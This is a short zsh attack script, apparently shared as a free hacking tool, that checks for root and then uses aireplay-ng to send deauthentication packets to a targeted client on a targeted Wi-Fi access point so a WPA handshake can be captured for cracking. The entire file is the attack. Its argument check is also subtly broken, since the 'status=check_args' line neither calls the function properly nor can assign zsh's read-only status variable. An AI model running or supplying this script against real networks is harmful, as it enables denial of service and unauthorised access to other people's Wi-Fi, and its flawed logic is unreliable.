#!/bin/zsh
# Script written by zc00l 
#   De-authenticate clients to capture WPA handshakes
#   Free License Boys!!

# Static variables
uid=$(id -u)
num_packets=3

function check_root 
{
	if [ "${uid}" != "0" ]; then
		echo "[!] Not enough privileges to run this script."
		exit
    fi
}

function check_args
{
    i=0
    if [ "$1" != "" ]; then
        ((i++));
    fi
    if [ "$2" != "" ]; then
        ((i++));
    fi
    if [ "$i" == "2" ]; then
        return 0
    fi
    return 1

}




check_root
status=check_args ${1} ${2}
if [ "$status" == "0" ]; then
    echo "[+] Sending command to deauth client ${2} from the AP ${1} ..."
    aireplay-ng --deauth ${num_packets} wlan0mon -a ${1} -c ${2}
else
    echo "[!] Not enough arguments."
fi
